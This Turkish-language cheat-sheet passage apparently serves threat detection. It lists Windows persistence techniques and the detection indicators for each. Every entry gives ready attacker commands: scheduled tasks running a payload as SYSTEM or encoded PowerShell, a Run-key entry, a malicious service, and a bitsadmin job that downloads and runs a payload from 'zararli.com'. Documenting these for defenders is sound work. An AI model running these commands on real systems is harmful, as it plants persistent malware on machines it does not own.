

### schtasks.exe

Zamanlanmış görev yönetimi. Persistence için görev oluşturma.

**Komut:**
- schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc onlogon /ru SYSTEM

- schtasks /create /tn "Updater" /tr "powershell -enc [base64]" /sc minute /mo 5

**IOC:** Security 4698, Temp/AppData'dan binary, SYSTEM yetkisiyle user task

---

### reg.exe

Registry yönetimi. Run key persistence.

**Komut:**
- reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\temp\payload.exe" /f

**IOC:** Run key yazımı, Temp veya AppData'dan binary path

---

### sc.exe

Service Control Manager. Zararlı servis kurma.

**Komut:**
- sc create EvilSvc binPath= "C:\temp\payload.exe" start= auto

- sc start EvilSvc

**IOC:** System 7045, binPath'te Temp veya kullanıcı dizini

---

### bitsadmin.exe

BITS job yönetimi. Uzun süreli BITS job'ları reboot sonrası devam eder — persistence.

**Komut:**
- bitsadmin /create /download PersistJob

- bitsadmin /addfile PersistJob http://zararli.com/payload.exe C:\temp\p.exe

- bitsadmin /SetNotifyCmdLine PersistJob C:\temp\p.exe NULL

- bitsadmin /resume PersistJob

**IOC:** SetNotifyCmdLine parametresi = job tamamlanınca komut çalıştırma, BITS-Client log


